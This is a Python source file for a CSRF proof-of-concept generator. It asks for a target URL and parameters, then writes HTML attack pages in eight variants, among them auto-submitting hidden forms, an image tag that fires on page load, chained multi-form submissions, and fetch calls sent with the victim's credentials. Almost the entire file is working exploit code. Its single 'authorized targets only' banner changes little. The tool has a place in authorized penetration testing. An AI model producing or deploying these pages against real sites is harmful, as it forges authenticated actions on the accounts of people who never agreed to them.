#!/usr/bin/env python3
"""
CSRF PoC Generator
Generate HTML proof-of-concept for Cross-Site Request Forgery vulnerabilities
"""

import re
from urllib.parse import urlparse, parse_qs, urlencode
from html import escape

def run():
    print("\033[92m" + "="*70)
    print("           CSRF POC GENERATOR")
    print("="*70 + "\033[0m\n")
    
    print("\033[93m[!] WARNING: Only test CSRF on authorized targets!\033[0m\n")
    
    print("\033[97mChoose PoC Type:\033[0m")
    print("  [1] GET Request CSRF")
    print("  [2] POST Form CSRF (Auto-submit)")
    print("  [3] POST Form CSRF (Manual submit)")
    print("  [4] AJAX/XMLHttpRequest CSRF")
    print("  [5] Image Tag CSRF")
    print("  [6] Multi-form CSRF (Multiple actions)")
    print("  [7] JSON POST CSRF")
    print("  [8] File Upload CSRF")
    
    choice = input("\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        generate_get_csrf()
    elif choice == '2':
        generate_post_csrf(auto_submit=True)
    elif choice == '3':
        generate_post_csrf(auto_submit=False)
    elif choice == '4':
        generate_ajax_csrf()
    elif choice == '5':
        generate_img_csrf()
    elif choice == '6':
        generate_multi_csrf()
    elif choice == '7':
        generate_json_csrf()
    elif choice == '8':
        generate_file_upload_csrf()
    else:
        print("\033[91m[!] Invalid choice.\033[0m")

def generate_get_csrf():
    """Generate GET request CSRF PoC"""
    print("\n\033[92m[*] GET Request CSRF PoC Generator\033[0m\n")
    
    url = input("\033[97m[?] Target URL (with parameters): \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    description = input("\033[97m[?] Attack description: \033[0m").strip() or "CSRF Attack"
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {escape(description)}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }}
        .container {{
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 20px;
            background-color: #ffe0e0;
        }}
        h1 {{
            color: #c92a2a;
        }}
        .attack-url {{
            background-color: #fff;
            padding: 10px;
            border-radius: 4px;
            word-break: break-all;
            margin: 10px 0;
        }}
        button {{
            background-color: #c92a2a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }}
        button:hover {{
            background-color: #a61e1e;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 CSRF Proof of Concept</h1>
        <p><strong>Description:</strong> {escape(description)}</p>
        <p><strong>Method:</strong> GET Request</p>
        
        <p><strong>Target URL:</strong></p>
        <div class="attack-url">{escape(url)}</div>
        
        <p>Click the button below to trigger the CSRF attack:</p>
        <button onclick="executeAttack()">Execute CSRF Attack</button>
        
        <p style="margin-top: 20px; color: #666; font-size: 14px;">
            <em>Note: The attack will execute in a hidden iframe to avoid navigation.</em>
        </p>
    </div>
    
    <iframe id="csrf-frame" style="display:none;"></iframe>
    
    <script>
        function executeAttack() {{
            console.log('[CSRF] Executing attack...');
            document.getElementById('csrf-frame').src = '{escape(url)}';
            alert('CSRF attack executed! Check the network tab.');
        }}
        
        // Auto-execute on page load (comment out for manual trigger)
        // window.onload = function() {{ executeAttack(); }};
    </script>
</body>
</html>"""
    
    save_poc(html, "csrf_get_poc.html")

def generate_post_csrf(auto_submit=True):
    """Generate POST form CSRF PoC"""
    submit_type = "Auto-submit" if auto_submit else "Manual"
    print(f"\n\033[92m[*] POST Form CSRF PoC Generator ({submit_type})\033[0m\n")
    
    action_url = input("\033[97m[?] Form action URL: \033[0m").strip()
    if not action_url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    description = input("\033[97m[?] Attack description: \033[0m").strip() or "CSRF Attack"
    
    print("\n\033[97m[*] Enter form parameters (name=value). Press Enter with no input when done:\033[0m")
    params = []
    while True:
        param = input("\033[97m    Parameter: \033[0m").strip()
        if not param:
            break
        if '=' in param:
            name, value = param.split('=', 1)
            params.append((name.strip(), value.strip()))
    
    if not params:
        print("\033[91m[!] No parameters provided.\033[0m")
        return
    
    # Generate form fields
    form_fields = ""
    for name, value in params:
        form_fields += f'        <input type="hidden" name="{escape(name)}" value="{escape(value)}" />\n'
    
    auto_submit_script = """
    <script>
        // Auto-submit form on page load
        window.onload = function() {
            console.log('[CSRF] Auto-submitting form...');
            document.getElementById('csrf-form').submit();
        };
    </script>""" if auto_submit else ""
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {escape(description)}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }}
        .container {{
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 20px;
            background-color: #ffe0e0;
        }}
        h1 {{
            color: #c92a2a;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 10px 0;
            background-color: #fff;
        }}
        th, td {{
            padding: 8px;
            text-align: left;
            border: 1px solid #ddd;
        }}
        th {{
            background-color: #f8f9fa;
        }}
        button {{
            background-color: #c92a2a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }}
        button:hover {{
            background-color: #a61e1e;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 CSRF Proof of Concept</h1>
        <p><strong>Description:</strong> {escape(description)}</p>
        <p><strong>Method:</strong> POST Form ({'Auto-submit' if auto_submit else 'Manual'})</p>
        
        <p><strong>Target URL:</strong> {escape(action_url)}</p>
        
        <p><strong>Form Parameters:</strong></p>
        <table>
            <tr>
                <th>Parameter</th>
                <th>Value</th>
            </tr>
{chr(10).join(f'            <tr><td>{escape(name)}</td><td>{escape(value)}</td></tr>' for name, value in params)}
        </table>
        
        <form id="csrf-form" action="{escape(action_url)}" method="POST" target="csrf-frame">
{form_fields}
            <button type="submit">{'This form will auto-submit' if auto_submit else 'Execute CSRF Attack'}</button>
        </form>
        
        <p style="margin-top: 20px; color: #666; font-size: 14px;">
            <em>Note: The request will be sent in a hidden iframe.</em>
        </p>
    </div>
    
    <iframe name="csrf-frame" id="csrf-frame" style="display:none;"></iframe>
    {auto_submit_script}
</body>
</html>"""
    
    filename = "csrf_post_auto.html" if auto_submit else "csrf_post_manual.html"
    save_poc(html, filename)

def generate_ajax_csrf():
    """Generate AJAX/XMLHttpRequest CSRF PoC"""
    print("\n\033[92m[*] AJAX CSRF PoC Generator\033[0m\n")
    
    url = input("\033[97m[?] Target URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    method = input("\033[97m[?] HTTP Method (GET/POST): \033[0m").strip().upper() or "POST"
    description = input("\033[97m[?] Attack description: \033[0m").strip() or "CSRF Attack"
    
    data = input("\033[97m[?] Request body (JSON or form data): \033[0m").strip()
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {escape(description)}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }}
        .container {{
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 20px;
            background-color: #ffe0e0;
        }}
        h1 {{
            color: #c92a2a;
        }}
        pre {{
            background-color: #fff;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }}
        button {{
            background-color: #c92a2a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 CSRF Proof of Concept (AJAX)</h1>
        <p><strong>Description:</strong> {escape(description)}</p>
        <p><strong>Method:</strong> {escape(method)} (XMLHttpRequest)</p>
        <p><strong>Target URL:</strong> {escape(url)}</p>
        
        <p><strong>Request Body:</strong></p>
        <pre>{escape(data)}</pre>
        
        <button onclick="executeAjaxAttack()">Execute AJAX CSRF</button>
        
        <div id="response" style="margin-top: 20px;"></div>
    </div>
    
    <script>
        function executeAjaxAttack() {{
            console.log('[CSRF] Executing AJAX attack...');
            
            var xhr = new XMLHttpRequest();
            xhr.open('{escape(method)}', '{escape(url)}', true);
            
            // Set headers (may be blocked by CORS)
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            // xhr.setRequestHeader('Content-Type', 'application/json'); // Uncomment for JSON
            
            xhr.onload = function() {{
                document.getElementById('response').innerHTML = 
                    '<strong>Response:</strong><br>' + 
                    '<pre>' + xhr.status + ' ' + xhr.statusText + '</pre>';
                console.log('[CSRF] Response:', xhr.responseText);
            }};
            
            xhr.onerror = function() {{
                document.getElementById('response').innerHTML = 
                    '<strong style="color: red;">Error: Request failed (CORS?)</strong>';
                console.error('[CSRF] Request failed');
            }};
            
            xhr.send('{escape(data)}');
            alert('CSRF attack executed! Check console and network tab.');
        }}
        
        // Auto-execute (uncomment to enable)
        // window.onload = function() {{ executeAjaxAttack(); }};
    </script>
</body>
</html>"""
    
    save_poc(html, "csrf_ajax_poc.html")

def generate_img_csrf():
    """Generate image tag CSRF PoC"""
    print("\n\033[92m[*] Image Tag CSRF PoC Generator\033[0m\n")
    
    url = input("\033[97m[?] Target URL (must be GET request): \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    description = input("\033[97m[?] Attack description: \033[0m").strip() or "CSRF Attack"
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - {escape(description)}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }}
        .container {{
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 20px;
            background-color: #ffe0e0;
        }}
        h1 {{
            color: #c92a2a;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 CSRF Proof of Concept (Image Tag)</h1>
        <p><strong>Description:</strong> {escape(description)}</p>
        <p><strong>Method:</strong> GET (via &lt;img&gt; tag)</p>
        <p><strong>Target URL:</strong> {escape(url)}</p>
        
        <p>The CSRF attack executes automatically when this page loads.</p>
        <p style="color: #666; font-size: 14px;">
            <em>The image tag below triggers the request silently.</em>
        </p>
    </div>
    
    <!-- CSRF payload - executes on page load -->
    <img src="{escape(url)}" style="display:none;" 
         onerror="console.log('[CSRF] Request completed (error expected)');"
         onload="console.log('[CSRF] Request completed successfully');" />
    
    <script>
        console.log('[CSRF] Image tag CSRF triggered');
        console.log('[CSRF] Target: {escape(url)}');
    </script>
</body>
</html>"""
    
    save_poc(html, "csrf_img_poc.html")

def generate_multi_csrf():
    """Generate multi-form CSRF PoC"""
    print("\n\033[92m[*] Multi-Form CSRF PoC Generator\033[0m\n")
    print("\033[97m[*] This PoC can execute multiple CSRF attacks in sequence\033[0m\n")
    
    description = input("\033[97m[?] Attack description: \033[0m").strip() or "Multi-CSRF Attack"
    
    forms = []
    while True:
        print(f"\n\033[93m[*] Form {len(forms) + 1}\033[0m")
        url = input("\033[97m[?] Action URL (or press Enter to finish): \033[0m").strip()
        if not url:
            break
        
        form_desc = input("\033[97m[?] Form description: \033[0m").strip() or f"Action {len(forms) + 1}"
        
        print("\033[97m[*] Parameters (name=value, Enter to finish):\033[0m")
        params = []
        while True:
            param = input("\033[97m    Parameter: \033[0m").strip()
            if not param:
                break
            if '=' in param:
                name, value = param.split('=', 1)
                params.append((name.strip(), value.strip()))
        
        forms.append({'url': url, 'desc': form_desc, 'params': params})
    
    if not forms:
        print("\033[91m[!] No forms provided.\033[0m")
        return
    
    # Generate forms HTML
    forms_html = ""
    for i, form in enumerate(forms):
        form_fields = "\n".join(
            f'            <input type="hidden" name="{escape(name)}" value="{escape(value)}" />'
            for name, value in form['params']
        )
        
        forms_html += f"""
        <div class="form-section">
            <h3>{i+1}. {escape(form['desc'])}</h3>
            <p><strong>URL:</strong> {escape(form['url'])}</p>
            <form id="csrf-form-{i}" action="{escape(form['url'])}" method="POST" target="csrf-frame">
{form_fields}
            </form>
        </div>
"""
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Multi-CSRF PoC - {escape(description)}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }}
        .container {{
            border: 2px solid #ff6b6b;
            border-radius: 8px;
            padding: 20px;
            background-color: #ffe0e0;
        }}
        .form-section {{
            background-color: #fff;
            padding: 15px;
            margin: 10px 0;
            border-radius: 4px;
        }}
        h1 {{
            color: #c92a2a;
        }}
        button {{
            background-color: #c92a2a;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 Multi-CSRF Proof of Concept</h1>
        <p><strong>Description:</strong> {escape(description)}</p>
        <p><strong>Total Forms:</strong> {len(forms)}</p>
        
        {forms_html}
        
        <button onclick="executeAllAttacks()">Execute All CSRF Attacks</button>
        <div id="status" style="margin-top: 20px;"></div>
    </div>
    
    <iframe name="csrf-frame" style="display:none;"></iframe>
    
    <script>
        function executeAllAttacks() {{
            console.log('[CSRF] Executing {len(forms)} attacks...');
            var delay = 0;
            
            {chr(10).join(f"            setTimeout(function() {{ document.getElementById('csrf-form-{i}').submit(); console.log('[CSRF] Submitted form {i+1}'); }}, delay += 1000);" for i in range(len(forms)))}
            
            document.getElementById('status').innerHTML = 
                '<strong style="color: green;">All attacks executed! Check network tab.</strong>';
        }}
        
        // Auto-execute (uncomment to enable)
        // window.onload = function() {{ executeAllAttacks(); }};
    </script>
</body>
</html>"""
    
    save_poc(html, "csrf_multi_poc.html")

def generate_json_csrf():
    """Generate JSON POST CSRF PoC"""
    print("\n\033[92m[*] JSON POST CSRF PoC Generator\033[0m\n")
    
    url = input("\033[97m[?] Target URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    description = input("\033[97m[?] Attack description: \033[0m").strip() or "JSON CSRF Attack"
    json_data = input("\033[97m[?] JSON payload: \033[0m").strip()
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>JSON CSRF PoC - {escape(description)}</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }}
        .container {{ border: 2px solid #ff6b6b; border-radius: 8px; padding: 20px; background-color: #ffe0e0; }}
        h1 {{ color: #c92a2a; }}
        pre {{ background-color: #fff; padding: 10px; border-radius: 4px; }}
        button {{ background-color: #c92a2a; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 JSON CSRF Proof of Concept</h1>
        <p><strong>Description:</strong> {escape(description)}</p>
        <p><strong>Target:</strong> {escape(url)}</p>
        <p><strong>Payload:</strong></p>
        <pre>{escape(json_data)}</pre>
        <button onclick="executeJSONAttack()">Execute JSON CSRF</button>
    </div>
    
    <script>
        function executeJSONAttack() {{
            fetch('{escape(url)}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: '{escape(json_data)}',
                credentials: 'include'
            }})
            .then(response => console.log('[CSRF] Response:', response))
            .catch(error => console.error('[CSRF] Error:', error));
            
            alert('JSON CSRF executed! Check console.');
        }}
    </script>
</body>
</html>"""
    
    save_poc(html, "csrf_json_poc.html")

def generate_file_upload_csrf():
    """Generate file upload CSRF PoC"""
    print("\n\033[92m[*] File Upload CSRF PoC Generator\033[0m\n")
    
    url = input("\033[97m[?] Upload URL: \033[0m").strip()
    if not url:
        print("\033[91m[!] No URL provided.\033[0m")
        return
    
    field_name = input("\033[97m[?] File field name: \033[0m").strip() or "file"
    filename = input("\033[97m[?] Filename: \033[0m").strip() or "malicious.txt"
    content = input("\033[97m[?] File content: \033[0m").strip() or "CSRF Test Content"
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>File Upload CSRF PoC</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }}
        .container {{ border: 2px solid #ff6b6b; border-radius: 8px; padding: 20px; background-color: #ffe0e0; }}
        button {{ background-color: #c92a2a; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🚨 File Upload CSRF PoC</h1>
        <p><strong>Target:</strong> {escape(url)}</p>
        <p><strong>Filename:</strong> {escape(filename)}</p>
        <button onclick="uploadFile()">Execute File Upload CSRF</button>
    </div>
    
    <script>
        function uploadFile() {{
            var formData = new FormData();
            var blob = new Blob(['{escape(content)}'], {{ type: 'text/plain' }});
            formData.append('{escape(field_name)}', blob, '{escape(filename)}');
            
            fetch('{escape(url)}', {{
                method: 'POST',
                body: formData,
                credentials: 'include'
            }})
            .then(response => console.log('[CSRF] Upload response:', response))
            .catch(error => console.error('[CSRF] Upload error:', error));
            
            alert('File upload CSRF executed!');
        }}
    </script>
</body>
</html>"""
    
    save_poc(html, "csrf_upload_poc.html")

def save_poc(html, filename):
    """Save PoC HTML to file"""
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"\n\033[92m[+] PoC saved to: {filename}\033[0m")
        print(f"\033[97m[*] Open this file in a browser to execute the CSRF attack\033[0m")
        print(f"\033[93m[!] Ensure you're authenticated to the target site first\033[0m\n")
    except Exception as e:
        print(f"\033[91m[!] Error saving file: {str(e)}\033[0m")

if __name__ == "__main__":
    run()
